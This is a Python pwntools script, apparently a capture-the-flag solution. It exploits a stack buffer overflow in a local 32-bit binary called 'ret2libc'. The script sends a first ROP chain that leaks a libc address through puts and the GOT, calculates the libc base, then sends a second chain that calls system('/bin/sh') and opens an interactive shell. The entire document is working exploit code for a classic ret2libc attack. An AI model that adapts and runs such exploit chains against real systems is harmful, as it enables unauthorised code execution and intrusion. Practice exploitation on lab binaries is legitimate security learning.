from pwn import *

# the binary is a 32-bit little-endian ELF
context.update(arch='i386', endian='little', os='linux')

elf = ELF('./ret2libc')
libc = ELF('./libc6_2.31-0ubuntu9_i386.so')

p = elf.process()

func = '__libc_start_main'
# func = 'puts'

offset = 112
puts_plt = 0x80490c0

p.recvuntil(b'shell!\n')

ropchain = b'A' * offset
ropchain += p32(puts_plt)
ropchain += p32(elf.symbols['vuln'])
ropchain += p32(elf.got[func])

p.sendline(ropchain)

leaked_func = u32(p.recvline()[:4])
log.info(f'Leaked {func} : ' + hex(leaked_func))

libc.address = leaked_func - libc.symbols[func]

p.recvuntil(b'shell!\n')

ropchain = b'A' * offset
ropchain += p32(libc.symbols['system'])
ropchain += p32(libc.symbols['exit'])
ropchain += p32(next(libc.search(b'/bin/sh')))

p.sendline(ropchain)

p.interactive()